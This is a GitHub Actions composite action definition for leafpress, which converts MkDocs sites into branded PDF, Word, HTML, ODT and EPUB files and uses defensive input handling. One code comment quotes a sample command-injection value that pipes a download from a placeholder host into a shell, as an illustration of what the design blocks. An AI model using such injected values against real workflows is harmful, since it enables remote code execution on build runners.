name: leafpress
description: Convert an MkDocs site to PDF, Word, HTML, ODT, and EPUB documents with branding
author: Shane Hutchins

inputs:
  source:
    description: Path to the MkDocs project directory
    default: "."
  output:
    description: Output directory for generated files
    default: "dist"
  format:
    description: "Output format: pdf, docx, html, odt, epub, both (pdf+docx), or all"
    default: "pdf"
  config:
    description: Path to leafpress.yml branding config (optional — uses auto-detection or LEAFPRESS_* env vars)
    required: false
    default: ""
  cover_page:
    description: Include a cover page (true/false)
    default: "true"
  toc:
    description: Include a table of contents (true/false)
    default: "true"
  local_time:
    description: Use local timezone for dates instead of UTC (true/false)
    default: "false"
  python_version:
    description: Python version to use
    default: "3.13"

outputs:
  files:
    description: Newline-separated list of generated output file paths
    value: ${{ steps.convert.outputs.files }}

runs:
  using: composite
  steps:
    - name: Install WeasyPrint system dependencies
      if: runner.os == 'Linux'
      shell: bash
      run: |
        sudo apt-get update -qq
        sudo apt-get install -y \
          libpango-1.0-0 \
          libharfbuzz0b \
          libpangoft2-1.0-0 \
          libfontconfig1

    - name: Set up Python
      uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
      with:
        python-version: ${{ inputs.python_version }}
        cache: pip

    # Install leafpress from this action's own checkout so `uses: hutchins/leafpress@<ref>`
    # runs exactly the code at that ref, not whatever is newest on PyPI.
    - name: Install leafpress
      shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
      run: pip install "${ACTION_PATH}[pdf]"

    # Inputs are passed through env vars, never interpolated into the script,
    # so a value like `"; curl evil | sh; #` stays a plain string.
    - name: Convert docs
      id: convert
      shell: bash
      env:
        INPUT_SOURCE: ${{ inputs.source }}
        INPUT_FORMAT: ${{ inputs.format }}
        INPUT_OUTPUT: ${{ inputs.output }}
        INPUT_CONFIG: ${{ inputs.config }}
        INPUT_COVER_PAGE: ${{ inputs.cover_page }}
        INPUT_TOC: ${{ inputs.toc }}
        INPUT_LOCAL_TIME: ${{ inputs.local_time }}
      run: |
        LEAFPRESS_ARGS=("-f" "$INPUT_FORMAT" "-o" "$INPUT_OUTPUT")
        if [ -n "$INPUT_CONFIG" ]; then
          LEAFPRESS_ARGS+=("-c" "$INPUT_CONFIG")
        fi
        if [ "$INPUT_COVER_PAGE" = "false" ]; then
          LEAFPRESS_ARGS+=("--no-cover-page")
        fi
        if [ "$INPUT_TOC" = "false" ]; then
          LEAFPRESS_ARGS+=("--no-toc")
        fi
        if [ "$INPUT_LOCAL_TIME" = "true" ]; then
          LEAFPRESS_ARGS+=("--local-time")
        fi
        # `--` ends option parsing so a source starting with `-` can't become a flag
        leafpress convert "${LEAFPRESS_ARGS[@]}" -- "$INPUT_SOURCE"
        FILES=$(find "$INPUT_OUTPUT" -type f 2>/dev/null | sort)
        # Random heredoc delimiter so file names can't inject extra outputs
        DELIM="EOF_$(openssl rand -hex 16)"
        {
          echo "files<<$DELIM"
          echo "$FILES"
          echo "$DELIM"
        } >> "$GITHUB_OUTPUT"

branding:
  icon: file-text
  color: blue
